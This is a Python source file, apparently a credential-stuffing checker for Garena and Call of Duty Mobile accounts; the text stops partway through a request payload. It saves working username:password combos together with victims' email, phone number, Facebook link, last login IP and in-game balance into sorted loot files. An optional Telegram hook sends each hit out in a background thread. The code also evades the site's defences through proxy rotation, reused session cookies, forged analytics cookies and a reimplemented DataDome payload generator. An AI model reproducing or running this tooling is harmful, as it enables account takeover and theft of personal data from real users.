    def _write_sorted(self, filepath, new_entry_body, sort_by='level'):
        filepath = str(filepath)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with self._get_flock(filepath):
            entries = []
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read()
                raw_entries = content.strip().split('\n' + '=' * 60 + '\n')
                for raw_entry in raw_entries:
                    raw_entry = raw_entry.strip()
                    if raw_entry:
                        if raw_entry.startswith('=' * 60):
                            raw_entry = raw_entry[len('=' * 60):].strip()
                        if raw_entry.endswith('=' * 60):
                            raw_entry = raw_entry[:-len('=' * 60)].strip()
                        entries.append(raw_entry)
            new_entry = new_entry_body.strip()
            if new_entry.startswith('=' * 60):
                new_entry = new_entry[len('=' * 60):].strip()
            if new_entry.endswith('=' * 60):
                new_entry = new_entry[:-len('=' * 60)].strip()
            entries.append(new_entry)

            if sort_by == 'shell':
                entries.sort(key=self._entry_shell, reverse=True)
            else:
                entries.sort(key=self._entry_level, reverse=True)

            with open(filepath, 'w', encoding='utf-8', errors='replace') as f:
                for i, entry in enumerate(entries):
                    f.write('=' * 60 + '\n')
                    f.write(entry.strip())
                    f.write('\n' + '=' * 60)
                    if i < len(entries) - 1:
                        f.write('\n\n')

    def _append_line(self, filepath, line):
        filepath = str(filepath)
        with self._get_flock(filepath):
            with open(filepath, 'a', encoding='utf-8', errors='replace') as f:
                f.write(line + '\n')

    @staticmethod
    def _ascii(val):
        if not val or val == 'N/A':
            return val
        cleaned = ''.join((c for c in str(val) if c >= ' ' or c in '\t')).strip()
        return cleaned or 'N/A'

    def _format_server(self, region_code):
        if not region_code or region_code == 'N/A':
            return 'N/A'
        _region_info = CODM_REGIONS.get(str(region_code).upper(), {}) if region_code and region_code != 'N/A' else {}
        return f"{_region_info['flag']} {_region_info['name']} ({region_code})" if _region_info else str(region_code)

    def _format_account(self, account_data, index=1):
        acct = account_data.get('account', 'N/A')
        pwd = account_data.get('password', 'N/A')
        if account_data.get('is_error'):
            return '=' * 60 + f"\nAccount: {acct}:{pwd}\nError: {account_data.get('error_reason', 'Unknown')}\n" + '=' * 60
        is_clean = account_data.get('is_clean', False)
        has_codm = account_data.get('has_codm', False)

        base_lines = [
            '=' * 60, f'Account: {acct}:{pwd}', f'UID: {account_data.get("uid", "N/A")}',
            f'Username: {self._ascii(account_data.get("username", "N/A"))}',
            f'Garena Shell: {account_data.get("shell_balance", 0)}',
            f'Email: {account_data.get("email_display", "N/A")}',
            f'Mobile: {account_data.get("formatted_mobile", "N/A")}',
            f'Country: {account_data.get("country", "N/A")}',
            f'Nickname: {self._ascii(account_data.get("nickname", "N/A"))}',
            '', '--- Facebook Information ---',
            f'Facebook Username: {self._ascii(account_data.get("fb_username", "N/A"))}',
            f'Facebook Link: {account_data.get("fb_link", "N/A")}',
            f'Facebook Status: {account_data.get("fb_info", "N/A")}',
            '', '--- Login History ---',
            f'Last Login: {account_data.get("last_login_date", "N/A")}',
            f'Last Login From: {account_data.get("last_login_where", "N/A")}',
            f'Last Login IP: {account_data.get("last_login_ip", "N/A")}',
            f'Last Login Country: {account_data.get("last_login_country", "N/A")}',
            '', f'Account Status: {("Clean" if is_clean else "Not Clean")}',
            '', 'Powered by: @Dvlist', '=' * 60
        ]
        
        if not has_codm:
            return '\n'.join(base_lines)
        
        codm_lines = [
            '--- CODM Information ---',
            f'Account Level: {account_data.get("codm_level", "N/A")}',
            f'Server: {self._format_server(account_data.get("codm_region", "N/A"))}',
            f'IGN: {self._ascii(account_data.get("codm_nickname", "N/A"))}',
            f'UID: {account_data.get("codm_uid", account_data.get("uid", "N/A"))}', ''
        ]
        
        login_index = base_lines.index('--- Login History ---')
        final_lines = base_lines[:login_index] + codm_lines + base_lines[login_index:]
        return '\n'.join(final_lines)

    def add_account(self, account_data):
        if _TG_HOOK and (not account_data.get('is_error')):
            threading.Thread(target=_TG_HOOK, args=(account_data,), daemon=True).start()
        if account_data.get('is_error'):
            return
        combo = f"{account_data.get('account', '')}:{account_data.get('password', '')}"
        entry = self._format_account(account_data, index=self._next_index())
        has_codm = account_data.get('has_codm', False)
        is_clean = account_data.get('is_clean', False)
        shell = int(account_data.get('shell_balance', 0) or 0)

        self._write_sorted(self.base_dir / 'All Accounts.txt', entry)
        self._append_line(self.base_dir / 'Valid Accounts.txt', combo)

        if is_clean and has_codm:
            self._write_sorted(self.base_dir / 'Clean Accounts.txt', entry)
        elif has_codm:
            self._write_sorted(self.base_dir / 'Not Clean Accounts.txt', entry)

        if not has_codm:
            self._write_sorted(self.base_dir / 'No CODM Accounts.txt', entry)
            if shell > 0:
                self._write_sorted(self.base_dir / 'Garena Shells' / 'No CODM Shells.txt', entry, sort_by='shell')
            return

        country = str(account_data.get('country', 'XX') or 'XX').strip().upper()
        self._write_sorted(self.base_dir / 'Country' / f'{country} Accounts.txt', entry)

        try:
            lvl = int(account_data.get('codm_level', 0) or 0)
        except (ValueError, TypeError):
            lvl = 0
        bucket = '1-100.txt' if lvl <= 100 else '101-200.txt' if lvl <= 200 else '201-350.txt' if lvl <= 350 else '351-400.txt'
        self._write_sorted(self.base_dir / 'Level' / bucket, entry)

        if shell > 0:
            self._write_sorted(self.base_dir / 'Garena Shells' / 'CODM Shells.txt', entry, sort_by='shell')

_SCRIPT_DIR_COOKIE = os.path.dirname(os.path.abspath(__file__))
_TG_HOOK = None


_SESSION_FILE = 'cookies.txt'
_PROXIES_ACTIVE = False
_SESSION_POOL = []
_SESSION_POOL_INDEX = 0
_SESSION_POOL_LOCK = threading.Lock()

_DATADOME_SEEDS = []
_DATADOME_SEED_LOCK = threading.Lock()
_DATADOME_SEED_IDX = {'i': 0}

_SEEDS_FILE = 'seeds.txt'


def _load_datadome_seeds():
    global _DATADOME_SEEDS
    pool = []
    if os.path.exists(_SEEDS_FILE):
        try:
            with open(_SEEDS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if 'datadome=' in line:
                        for piece in line.split('|'):
                            piece = piece.strip()
                            if piece.startswith('datadome='):
                                v = piece.split('=', 1)[1].strip()
                                if v:
                                    pool.append(v)
                                break
                    else:
                        pool.append(line)
        except Exception:
            pass
    with _DATADOME_SEED_LOCK:
        _DATADOME_SEEDS = pool
        _DATADOME_SEED_IDX['i'] = 0
    return len(pool)


def _next_datadome_seed():
    with _DATADOME_SEED_LOCK:
        if not _DATADOME_SEEDS:
            return None
        i = _DATADOME_SEED_IDX['i']
        _DATADOME_SEED_IDX['i'] = (i + 1) % len(_DATADOME_SEEDS)
        return _DATADOME_SEEDS[i]
_SESSION_MAX_AGE_SECONDS = 6 * 3600

_SESSION_USES_PER_COOKIE = 10

_COOKIE_AUTH_MODE = False
_CURRENT_SESSION       = None
_CURRENT_SESSION_USES  = 0


def _load_session_pool():
    global _SESSION_POOL, _SESSION_POOL_INDEX, _CURRENT_SESSION, _CURRENT_SESSION_USES
    pool = []
    if os.path.exists(_SESSION_FILE):
        try:
            with open(_SESSION_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    pool.append(line)
        except Exception:
            pass
    with _SESSION_POOL_LOCK:
        _SESSION_POOL = pool
        _SESSION_POOL_INDEX = 0
        _CURRENT_SESSION = None
        _CURRENT_SESSION_USES = 0
    return len(pool)


def _load_session_index():
    return _load_session_pool()


def _capture_ac_session(session, session_key):
    if not session_key:
        return ''
    try:
        r = session.get(
            f'https://account.garena.com/?session_key={session_key}',
            headers={
                'user-agent': ('Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
                               '(KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36'),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            },
            timeout=6, allow_redirects=True,
        )
        ac = r.cookies.get('ac_session') or session.cookies.get('ac_session')
        if ac:
            session.cookies.set('ac_session', ac, domain='.garena.com')
        return ac or ''
    except Exception:
        return ''


def _get_any_session():
    global _SESSION_POOL_INDEX, _CURRENT_SESSION, _CURRENT_SESSION_USES
    with _SESSION_POOL_LOCK:
        if not _SESSION_POOL:
            return None

        if _CURRENT_SESSION and _CURRENT_SESSION_USES < _SESSION_USES_PER_COOKIE:
            _CURRENT_SESSION_USES += 1
            return _CURRENT_SESSION

        if _SESSION_POOL_INDEX >= len(_SESSION_POOL):
            _SESSION_POOL_INDEX = 0

        _CURRENT_SESSION      = _SESSION_POOL[_SESSION_POOL_INDEX]
        _CURRENT_SESSION_USES = 1
        _SESSION_POOL_INDEX  += 1
        return _CURRENT_SESSION

def _get_session_for(account):
    return _get_any_session()


def _apply_session_to(session, datadome_manager, session_entry):
    if not session_entry:
        return False
    cookie_str = ''
    if isinstance(session_entry, str):
        cookie_str = session_entry
    elif isinstance(session_entry, dict):
        cookie_str = session_entry.get('cookies', '')
    if not cookie_str:
        return False
    try:
        applyck(session, cookie_str)
        return True
    except Exception:
        return False


class ProxyManager:
    def __init__(self, enabled=True, fallback_url=None, proxy_file="proxies.txt"):
        self.enabled = enabled
        self.proxies = []
        self._index = 0
        self._counter = 0
        self._lock = threading.Lock()
        self._health = {}
        self._max_fails = 5
        self._cooldown_seconds = 300
        
        if not enabled:
            return
            
        if fallback_url:
            self.proxies = [fallback_url]
        elif proxy_file and Path(proxy_file).exists():
            self._load_from_file(proxy_file)

    def _load_from_file(self, proxy_file):
        with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                url = _parse_proxy_line(line)
                if url:
                    self.proxies.append(url)

    def _proxy_key(self, proxy_str):
        return proxy_str or '__direct__'

    def report_success(self, proxy_url):
        if not self.enabled:
            return
        with self._lock:
            key = self._proxy_key(proxy_url)
            entry = self._health.setdefault(key, {'fails': 0, 'success': 0, 'cooldown_until': 0})
            entry['success'] += 1

    def report_failure(self, proxy_url, is_403=False):
        if not self.enabled:
            return
        with self._lock:
            key = self._proxy_key(proxy_url)
            entry = self._health.setdefault(key, {'fails': 0, 'success': 0, 'cooldown_until': 0})
            entry['fails'] += 1
            if is_403 or entry['fails'] >= self._max_fails:
                entry['cooldown_until'] = time.time() + self._cooldown_seconds
                entry['fails'] = 0

    def get_next(self):
        if not self.enabled or not self.proxies:
            return None
        with self._lock:
            now = time.time()
            for _ in range(len(self.proxies)):
                proxy = self.proxies[self._index % len(self.proxies)]
                self._index += 1
                entry = self._health.get(self._proxy_key(proxy), {'cooldown_until': 0})
                if entry.get('cooldown_until', 0) < now:
                    self._counter += 1
                    return {'http': proxy, 'https': proxy}
            proxy = self.proxies[self._index % len(self.proxies)]
            self._index += 1
            self._counter += 1
            return {'http': proxy, 'https': proxy}

    def is_loaded(self):
        return self.enabled and len(self.proxies) > 0

    def get_count(self):
        return len(self.proxies)

def extract_datadome_token(cookie_str):
    if not cookie_str:
        return ''
    val = cookie_str.strip()
    for sep in (';', '|'):
        if sep in val:
            for piece in val.split(sep):
                piece = piece.strip()
                if piece.startswith('datadome='):
                    return piece.split('=', 1)[1].strip()
    if val.startswith('datadome='):
        return val.split('=', 1)[1].strip()
    return val

class CookieManager:

    def __init__(self):
        self.banned_cookies = set()
        self.live_cookies = []
        self.lock = threading.Lock()
        self.load_banned_cookies()
        self.load_initial_cookies()

    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            try:
                with open('banned_cookies.txt', 'r', encoding='utf-8', errors='ignore') as f:
                    self.banned_cookies = set((line.strip() for line in f if line.strip()))
            except Exception:
                pass

    def _extract_dd(self, cookie_str):
        return extract_datadome_token(cookie_str)

    def is_banned(self, cookie):
        dd = self._extract_dd(cookie)
        return (cookie in self.banned_cookies) or (dd in self.banned_cookies) or (f'datadome={dd}' in self.banned_cookies)

    def load_initial_cookies(self):
        cookie_file = 'fresh_cookie.txt'
        if not os.path.exists(cookie_file):
            import glob as _glob
            candidates = sorted(_glob.glob('fresh_cookie*.txt')) + sorted(_glob.glob('seeds*.txt'))
            if candidates:
                cookie_file = candidates[0]
        if os.path.exists(cookie_file):
            try:
                with open(cookie_file, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        cookie = line.strip()
                        if cookie and not self.is_banned(cookie):
                            self.live_cookies.append(cookie)
            except Exception:
                pass

    def mark_banned(self, cookie_value):
        if not cookie_value:
            return
        dd = self._extract_dd(cookie_value)
        formatted_cookie = f'datadome={dd}' if dd else cookie_value
        with self.lock:
            if self.live_cookies:
                self.live_cookies = [ck for ck in self.live_cookies if self._extract_dd(ck) != dd and ck != formatted_cookie and ck != cookie_value]
            if formatted_cookie not in self.banned_cookies:
                self.banned_cookies.add(formatted_cookie)
                if dd:
                    self.banned_cookies.add(dd)
                self._append_to_file('banned_cookies.txt', formatted_cookie)

    def pick_cookie(self):
        with self.lock:
            if not self.live_cookies:
                return None
            return random.choice(self.live_cookies)

    def get_valid_cookies(self):
        with self.lock:
            if not self.live_cookies:
                return []
            return random.sample(self.live_cookies, min(5, len(self.live_cookies)))

    def save_cookie(self, datadome_value):
        if not datadome_value:
            return False
        val = datadome_value.strip()
        formatted_cookie = val if val.startswith('datadome=') else f'datadome={val}'
        with self.lock:
            if formatted_cookie not in self.banned_cookies and formatted_cookie not in self.live_cookies:
                self.live_cookies.append(formatted_cookie)
                self._append_to_file('fresh_cookie.txt', formatted_cookie)
                return True
        return False

    def _append_to_file(self, filename, content):
        try:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(content + '\n')
        except Exception:
            pass

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    if not cookie_str:
        return

    s = cookie_str.strip()
    pairs = []

    if '|' in s:
        for piece in s.split('|'):
            piece = piece.strip()
            if not piece or '=' not in piece:
                continue
            k, v = piece.split('=', 1)
            k, v = k.strip(), v.strip()
            if k:
                pairs.append((k, v))

    if not pairs:
        for piece in s.split(';'):
            piece = piece.strip()
            if not piece or '=' not in piece:
                continue
            try:
                k, v = piece.split('=', 1)
                pairs.append((k.strip(), v.strip()))
            except ValueError:
                pass

    for k, v in pairs:
        if not k or not v:
            continue
        if k == 'ga':
            session.cookies.set('_ga', v, domain='.garena.com')
        elif k.startswith('ga_') and not k.startswith('_ga'):
            session.cookies.set('_' + k, v, domain='.garena.com')
        else:
            session.cookies.set(k, v, domain='.garena.com')

_ip_wait_lock = threading.Lock()
_ip_wait_active = False
_ip_wait_event = threading.Event()
_suppress_ip_prints = False
_ip_block_callback = None

def _save_session_cookies(session):
    return False

def init_ga_cookies(session):
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    ga_cookies = {'_ga': f'GA1.1.{random_id}.{timestamp}', '_ga_XB5PSHEQB4': f'GS2.1.s{timestamp}$o1$g0$t{timestamp}$j53$l0$h0', '_ga_1M7M9L6VPX': f'GS2.1.s{timestamp}$o6$g0$t{timestamp}$j60$l0$h0'}
    for name, value in ga_cookies.items():
        session.cookies.set(name, value, domain='.garena.com')
    return ga_cookies

class DataDomeGenerator:

    def init(self, key: str, cookie: str):
        self.key = key
        self.cookie = cookie
        self.t = 9959949970
        self.n = 1789537805

    def _hash_str_to_int(self, s: str) -> int:
        if not s:
            return self.n
        o = 0
        for char in s:
            o = (o << 5) - o + ord(char) & 4294967295
        return o

    def _prng_h(self, n: int) -> int:
        n ^= n << 13
        n ^= n >> 17 & 4294967295
        n ^= n << 5
        return n & 4294967295

    def _create_keystream_generator(self, seed1: int, seed2: int):
        e = seed1
        i = -1
        r = seed2
        a = True
        u = None

        def generator(get_val: bool=False) -> int:
            nonlocal e, i, r, a, u
            if u is not None:
                t = u
                u = None
                return t
            i += 1
            if i > 2:
                e = self._prng_h(e)
                i = 0
            t = e >> 16 - 8 * i & 255
            if a:
                r -= 1
                t ^= r & 255
            if get_val:
                u = t
            return t
        a = False
        return generator

    def _custom_b64_encode_char(self, n: int) -> int:
        if 37 < n:
            return 59 + n
        if 11 < n:
            return 53 + n
        if 1 < n:
            return 46 + n
        return 50 * n + 45

    def generate_payload(self, data: Dict[str, Any], timestamp: int) -> str:
        seed_from_cookie = self._hash_str_to_int(self.cookie)
        initial_seed = self.t ^ seed_from_cookie ^ self._hash_str_to_int(self.key)
        e = self._prng_h(self._prng_h((timestamp >> 3 ^ 11027890091) * self.t))
        keystream_gen_a = self._create_keystream_generator(initial_seed, e)
        payload_bytes = []
        is_first = True

        def stringify(val: Any) -> str:
            return json.dumps(val)

        def encrypt_str(s: str) -> List[int]:
            buffer = s.encode('utf-8')
            encrypted = []
            for byte in buffer:
                encrypted.append(byte ^ keystream_gen_a())
            return encrypted
        for key, value in data.items():
            if not is_first:
                payload_bytes.append(keystream_gen_a() ^ 44)
            key_bytes = encrypt_str(stringify(key))
            value_bytes = encrypt_str(stringify(value))
            payload_bytes.extend(key_bytes)
            payload_bytes.append(keystream_gen_a() ^ 58)
            payload_bytes.extend(value_bytes)
            is_first = False
        keystream_gen_b = self._create_keystream_generator(1809053797 ^ self._hash_str_to_int(self.cookie), e)
        final_bytes = [byte ^ keystream_gen_b() for byte in payload_bytes]
        final_bytes.append(keystream_gen_a(True) ^ 125 ^ keystream_gen_b())
        result_chars = []
        w = 0
        b = e
        while w < len(final_bytes):
            b = b - 1 & 4294967295
            byte1 = b & 255 ^ final_bytes[w]
            w += 1
            b = b - 1 & 4294967295
            byte2 = b & 255 ^ final_bytes[w] if w < len(final_bytes) else 0
            w += 1
            b = b - 1 & 4294967295
            byte3 = b & 255 ^ final_bytes[w] if w < len(final_bytes) else 0
            w += 1
            z = byte1 << 16 | byte2 << 8 | byte3
            result_chars.append(chr(self._custom_b64_encode_char(z >> 18 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z >> 12 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z >> 6 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z & 63)))
        padding = len(final_bytes) % 3
        if padding > 0:
            return ''.join(result_chars[:-(3 - padding)])
        return ''.join(result_chars)

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        self._local_lock = threading.Lock()
        self._local_request_count = 0
        self._local_max_requests = 800

    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)

    def get_datadome(self):
        return self.current_datadome

    def clear_datadome(self):
        self.current_datadome = None

    def tick_request(self):
        with self._local_lock:
            self._local_request_count += 1

    def needs_rotation(self):
        with self._local_lock:
            return self._local_request_count >= self._local_max_requests

    def reset_counter(self):
        with self._local_lock:
            self._local_request_count = 0

    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception:
            return None

    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception:
            pass

    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception:
            return False

    def get_current_ip(self):
        ip_services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']
        for service in ip_services:
            try:
                response = requests.get(service, timeout=8)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except Exception:
                continue
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        global _ip_wait_lock, _ip_wait_active, _ip_wait_event, _PROXIES_ACTIVE
        if _PROXIES_ACTIVE:
            return False
        with _ip_wait_lock:
            if _ip_wait_active:
                is_primary = False
            else:
                _ip_wait_active = True
                _ip_wait_event.clear()
                is_primary = True
        if not is_primary:
            _ip_wait_event.wait(timeout=max_wait_time + 30)
            return True
        try:
            original_ip = self.get_current_ip()
            if not original_ip:
                if not _suppress_ip_prints:
                    _log('WARNING', 'IP BLOCKED — could not detect IP, waiting 10s')
                if _ip_block_callback:
                    _ip_block_callback(True)
                time.sleep(10)
                if _ip_block_callback:
                    _ip_block_callback(False)
                return True
            if not _suppress_ip_prints:
                _log('ERROR', f'IP BLOCKED — [bold]{original_ip}[/bold]')
                _log('WARNING', 'Change your IP now — VPN / Mobile Data / Airplane Mode')
            if _ip_block_callback:
                _ip_block_callback(True)
            start_time = time.time()
            if not _suppress_ip_prints:
                with Progress(SpinnerColumn(), TextColumn('[progress.description]{task.description}'), BarColumn(), TimeElapsedColumn(), console=console, transient=True) as progress:
                    task = progress.add_task('[yellow]Waiting for IP change…', total=max_wait_time)
                    while time.time() - start_time < max_wait_time:
                        time.sleep(check_interval)
                        progress.update(task, completed=time.time() - start_time)
                        current_ip = self.get_current_ip()
                        if current_ip and current_ip != original_ip:
                            _log('SUCCESS', f'IP changed: [dim]{original_ip}[/dim] → [bold bright_green]{current_ip}[/bold bright_green]')
                            if _ip_block_callback:
                                _ip_block_callback(False)
                            return True
                _log('ERROR', 'IP did not change within time limit')
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
            else:
                _last_tick = time.time()
                while time.time() - start_time < max_wait_time:
                    time.sleep(check_interval)
                    if time.time() - _last_tick >= 3.0:
                        if _ip_block_callback:
                            _ip_block_callback(True)
                        try:
                            _elapsed = int(time.time() - start_time)
                            _ip_now = self.get_current_ip() or 'unknown'
                            _log_line = f'[dim]····[/dim]  [red]IP WAIT[/red]  [dim]{_elapsed}s  ·  current={_ip_now}[/dim]'
                            _cb = globals().get('_dashboard_ref')
                            if _cb:
                                with _cb._lock:
                                    _cb.recent.append(_log_line)
                                    _cb._dirty = True
                        except Exception:
                            pass
                        _last_tick = time.time()
                    current_ip = self.get_current_ip()
                    if current_ip and current_ip != original_ip:
                        if _ip_block_callback:
                            _ip_block_callback(False)
                        return True
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
        finally:
            with _ip_wait_lock:
                _ip_wait_active = False
            _ip_wait_event.set()

    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if self.wait_for_ip_change(session):
                self._403_attempts = 0
                self.clear_datadome()
                self.reset_counter()
                self.clear_session_datadome(session)
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                return True
            else:
                return False
        return False

def get_datadome_cookie(session, proxies=None):
    url = 'https://datadome.garena.com/js/'
    headers = {
        'host': 'datadome.garena.com',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        'content-type': 'application/x-www-form-urlencoded',
        'sec-ch-ua-mobile': '?1',
        'accept': '*/*',
        'origin': 'https://account.garena.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://account.garena.com/',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=1, i'
    }
    payload = {
        'jspl': 'uhk7aBw8V8QkzKqkD7oowSyHXYy8ZX7MmiUVrKaorg4WGvVIeIUSbulWtdOJ-PUEdBXKeo0f3jFGgmzdlB85r2RTWFz9fVv5sihqWKKaYJ6CqD-x5zgp4GOG3qoJiFhGN4kuNWqswcZLbrpRGv_O6e2sAwpgKZ7UoEV71CS52-nzpUt2jfpFIwctsv3plEmyMubajP6vKWqxE6fF4kkWUvI8q9dzm6A5lBucuHv8D4ZIT-WHjjpgX1Q0FQkkEIjmpzHUxJ0DRxcPKRuxAUzAO6pONT5WAHDO1jKmP3X2um9tUpE2TL7uq4RFr39BXU1iVX-cCHBf_sW242UicatUznsEPvwDhgbbd7b3t1CWZ4bekhZNAa92m1_keFZXckvIVqAvC4nT35Ir9pKHWXIa15NRSZqUG32SVsipj9JUkNEStxCDYJqzBY-UMZeuXHIJdTitf1f0bndipuAe6bgF7yqCi7hIjD-PpV-L5RbW6i8HMiaxCiECXJUA6tebiecmDc1SZrhTDhWyD_jTwxjfveNNWKAsQH8EQ7G0xiD97wfxfNp7F2cdEcYj84ncOMT5BuhwIjhb8PwcPdu_bTVWbvSB6AgR0SJVShMjcVNKz9z2ol1m-lFkIMA78dlk-xqMBQa-P4V-UPqIwLHUsbhf4NP_CbSh49dkO2ul_jp3X-ZprX00HWUschukkHYxwuUd9ppO8L8dnaYVIFCltePBoWFTgaxjYrQEjuFbiy9uhMagFkGiLpt0JtBL0sGKM2JClV-KbTqDPix1hrTDU2LO20NFh6g8s3v42ix4zE6bqdijVO61jFYv2pZUJPGS6eTcKcLGbBwD1NYsI1aZ2OotVwX5i1udmlSjm3q_-7aguTeAWzmqZk36jUOrccoTnwAwDbRfpNqZU6gLVQs-xLYJhHCos3vGFCS-Ku4URj5fTmoZhdxqMViI-IaGQrEJ3qsEfuvi-ch9owf37yzu97gNduNAt0bhlHkE2BE05Yc-lcbcewv8yKp4F4G7ff-AlM3mejP6yhxvHuNqUXjLD-mXJ2axxVSfFep_Vh74lNGhTXbT4D_DfDohQonHT8U2Anml_5zsR8KFzVZRXn4HIbQcR_5E8PKijaoIU3OEhmjzMRledTIFLWD8gxruwMBMbgxFI11DxuwuIiCP4QFSMd9qItvv2lW5HXUN3tqdBf6ioXgCR1wkmZxwpXfbNrwovhZ9_58OvnplHBRFIj78DWKM5p2p83rXSpx6rH203gKthaI8XFJUBKtZZeW4TQB1fNaC_GCmw52cSPx7JdlP4JJkg43F8AXGcoQdGWmTLw_5aEH_glk2iFlH3UR6Q63h3a9CU6s6RcIDahxwRsx_GDmE-3yOuZ_aofpbq0gdZpfXf3lbRkUXPf52U-IMzWzFXTn23wzoauduqCFqomiuRr1lcInJQlZBk3n0gZRD_gA4MvKLChl8TAMbZfkqW56PIt1EAuKqFXzCfMtQa5fCdZ7NGrxhZ0iFedp446I9yP_GOjkNixwwLxSan4mmKLD9I4EZKves6_g4I0eFuFRep7MGKUrTbCc6CG4zB646VRJDN55PJqeJYA_H1yNQXOWfCyJHW3fK2G4u2CLbMyrHVw5ZCb_J2ScgqYRVKOUfGH31suG6mabkIonirhCf4qXfSUCwYeXL2L-Ka_EF28BSSO4tR6qnd8rHlZZvPQRrHuMuqthMkJxr7aW4GQUoewBYuQUienYbIIGv_Q86h2VA-kR_ibFE769ky5ALj2SPGBc_l0jSlhLGEO5ZX4UK_tVoREYH7Abn2pjhwnRGuvVGbTqb78yLLmhGSdgrIPAQLhkgoe-g9LSS0RoqNrrN3ffHDZ3mHIqI5MePIhmtI9ImH6mYk7tiqPvFLab6mvoTWTngVNe6bq51TxeHB1-Mnxe__4progZdJQndsIeSjyLkSGi2gDSH1tDCf3F4esSy-3YG1eZ3LG8pFbO9f3qS-lM0HQh2uKUa-Fa1ZvbHqXZkR46-_pIZpxai7QDm2EuwiR60p6e03FLIIn8DVM20KPsJp3KQlDhVP72sXewVMOVnedyiNT-XDhjJM7vqXetag8ctk9eXhKi3UTqj_PBK4mjQ-wSJ5REb2cwRW07jS_cxqcGTQOt7kgFHLoEWqFQ1qG2UJF2wjGR8MZ5oaUu6TTmQQBw1Pvu8qJEWTBMLcjTkP1VPse_YOuh_LggYMhZlPBLVnFRaOeMqV2Wd23ZAUxuwbjuY876AKFaUDS151nUdl8Asis9bN_ab7GNZ7OL3MaJ8vx7t6QerZUSuKY_ORWTw0Tlehb9VWmPNQRToNuZ6APk0ebEo2WHEdYewnKLwOvYG4ylIp12xYf2E1m1-3ajQHeUjGB__JpzADPIZsk654YNwPTyhINRDlSxOtCKKs0NOqM7i45ZLn9qDOjMIB-HQpKJsAxNFGCwGVqGd5X_ZOlotWW8jjZQ-57Wc3EiFqNM9aBB7FwBq6IeMOaqDNosY0EpLgJNUPC5zK8wX09BfqaUnsxE_Z-kYW639gJBIhyhCEbumEkV5-ZS4cXaO80n56XyMr8ZB4mSmTfYgg_n45xSvx07i1bZmfxT3YeQ8786d3lK3qMzlz828Og8L5-r7WqIQ5xAf00SBJ5aFuqXaunYMDUxMaF6Pku07heHKz66bAmdZL_6MYVbF3nfJhJWKrHIFa5yYK-KckQ2fwlpbKxitHDFrs0uUVSarjFrDS2cU8SDNUWMaT81waYXhX4FKV6fSjiJqIeiCKHHkkHHoAEkAAaVfZExm1sUvYickmv6w-hnpyhS1FOv4tFP2TcB1wuKhdpDuKKOxDMu4Qlps_ln88cYVUcrIyamgWr2hGwbho5T5_wuyaGD7LC63GV621TIxJ_P2TH5-dbtb26JF25CBGvu6bnJOXeRUBfUaJ9e2ZVs9iCvef0wvjQmGuHKOTfpTKhb6Mc2QV2wk7US-29PYUNS44_ivf272Acf2Zu4wtSedVWGEH0od9MiWEzdkW2n1pZK_zXPt-3cu3Jql7mF_yyRuKQfMfIMyiRnzIbnTKSOUxkRAnXPqP8tuDx